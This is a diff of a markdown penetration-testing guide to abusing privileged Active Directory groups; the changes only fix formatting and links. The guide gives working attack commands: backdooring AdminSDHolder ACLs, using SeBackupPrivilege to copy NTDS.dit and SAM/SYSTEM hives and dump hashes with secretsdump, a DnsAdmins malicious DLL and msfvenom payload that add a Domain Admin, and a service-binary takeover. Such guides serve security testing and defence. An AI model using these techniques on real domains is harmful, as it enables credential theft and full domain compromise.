@@ -1,6 +1,5 @@
 # Privileged Groups
 
-
 ## Well Known groups with administration privileges
 
 - **Administrators**
@@ -16,7 +15,7 @@ To identify the members of this group, the following command is executed:
 ```bash
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
-```
+
 Adding new users is permitted, as well as local login to the DC.
 
 ## AdminSDHolder group
@@ -32,10 +31,10 @@ Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
-```
-A script is available to expedite the restoration process: [[https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1|Invoke-ADSDPropagation.ps1]].
 
-For more details, visit [[https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence|ired.team]].
+A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+
+For more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
 
 ## AD Recycle Bin
 
@@ -44,7 +43,7 @@ Membership in this group allows for the reading of deleted Active Directory obje
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
-```
+
 ### Domain Controller Access
 
 Access to files on the DC is restricted unless the user is part of the `Server Operators` group, which changes the level of access.
@@ -56,7 +55,7 @@ Using `PsService` or `sc` from Sysinternals, one can inspect and modify service 
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
-```
+
 This command reveals that `Server Operators` have full access, enabling the manipulation of services for elevated privileges.
 
 ## Backup Operators
@@ -68,7 +67,7 @@ To list group members, execute:
 ```bash
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
-```
+
 ### Local Attack
 
 To leverage these privileges locally, the following steps are employed:
@@ -79,21 +78,21 @@ To leverage these privileges locally, the following steps are employed:
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
-```
+
 2. Enable and verify `SeBackupPrivilege`:
 
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-```
+
 3. Access and copy files from restricted directories, for instance:
 
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
 ```
-```
+
 ### AD Attack
 
 Direct access to the Domain Controller's file system allows for the theft of the `NTDS.dit` database, which contains all NTLM hashes for domain users and computers.
@@ -114,32 +113,32 @@ expose %cdrive% F:
 end backup
 exit
 ```
-```
+
 2. Copy `NTDS.dit` from the shadow copy:
 
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-```
+
 Alternatively, use `robocopy` for file copying:
 
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
-```
+
 3. Extract `SYSTEM` and `SAM` for hash retrieval:
 
 ```cmd
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-```
+
 4. Retrieve all hashes from `NTDS.dit`:
 
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
-```
+
 #### Using wbadmin.exe
 
 1. Set up NTFS filesystem for SMB server on attacker machine and cache SMB credentials on the target machine.
@@ -151,7 +150,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
    echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
    ```
 
-For a practical demonstration, see [[https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s|DEMO VIDEO WITH IPPSEC]].
+For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
 
 ## DnsAdmins
 
@@ -162,7 +161,7 @@ To list members of the DnsAdmins group, use:
 ```bash
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
-```
+
 ### Execute arbitrary DLL (CVE‑2021‑40469)
 
 > [!NOTE]
@@ -178,7 +177,7 @@ An attacker could modify the DLL to add a user to the Domain Admins group or exe
 # If dnscmd is not installed run from aprivileged PowerShell session:
 Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
 ```
-```
+
 ```c
 // Modify DLL to add user
 DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
@@ -187,24 +186,24 @@ DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunct
     system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
 }
 ```
-```
+
 ```bash
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-```
+
 Restarting the DNS service (which may require additional permissions) is necessary for the DLL to be loaded:
 
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-```
+
 For more details on this attack vector, refer to ired.team.
 
 #### Mimilib.dll
 
-It's also feasible to use mimilib.dll for command execution, modifying it to execute specific commands or reverse shells. [[https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html|Check this post]] for more information.
+It's also feasible to use mimilib.dll for command execution, modifying it to execute specific commands or reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.
 
 ### WPAD Record for MitM
 
@@ -218,7 +217,7 @@ Members can access event logs, potentially finding sensitive information such as
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
-```
+
 ## Exchange Windows Permissions
 
 This group can modify DACLs on the domain object, potentially granting DCSync privileges. Techniques for privilege escalation exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.
@@ -227,7 +226,7 @@ This group can modify DACLs on the domain object, potentially granting DCSync pr
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
-```
+
 ## Hyper-V Administrators
 
 Hyper-V Administrators have full access to Hyper-V, which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting NTLM hashes from the NTDS.dit file.
@@ -241,7 +240,7 @@ Firefox's Mozilla Maintenance Service can be exploited by Hyper-V Administrators
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
-```
+
 Note: Hard link exploitation has been mitigated in recent Windows updates.
 
 ## Group Policy Creators Owners	
@@ -263,7 +262,7 @@ To list the members of this group, the following PowerShell command is used:
 ```bash
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-```
+
 For more detailed exploitation techniques related to **`SeLoadDriverPrivilege`**, one should consult specific security resources.
 
 #### Remote Desktop Users
@@ -274,7 +273,7 @@ This group's members are granted access to PCs via Remote Desktop Protocol (RDP)
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
-```
+
 Further insights into exploiting RDP can be found in dedicated pentesting resources.
 
 #### Remote Management Users
@@ -285,7 +284,7 @@ Members can access PCs over **Windows Remote Management (WinRM)**. Enumeration o
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-```
+
 For exploitation techniques related to **WinRM**, specific documentation should be consulted.
 
 #### Server Operators
@@ -295,24 +294,21 @@ This group has permissions to perform various configurations on Domain Controlle
 ```bash
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-```
+
 ## References 
 
-- [[https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges|https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges]]
-- [[https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/|https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/]]
-- [[https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory|https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory]]
-- [[https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--|https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--]]
-- [[https://adsecurity.org/?p=3658|https://adsecurity.org/?p=3658]]
-- [[http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/|http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/]]
-- [[https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/|https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/]]
-- [[https://rastamouse.me/2019/01/gpo-abuse-part-1/|https://rastamouse.me/2019/01/gpo-abuse-part-1/]]
-- [[https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13|https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13]]
-- [[https://github.com/tandasat/ExploitCapcom|https://github.com/tandasat/ExploitCapcom]]
-- [[https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp|https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp]]
-- [[https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys|https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys]]
-- [[https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e|https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e]]
-- [[https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html|https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html]]
-
-
-
+- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
+- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
+- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
+- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
+- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
+- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
+- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
+- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
+- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
+- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
+- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
+- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
+- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
+- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
 
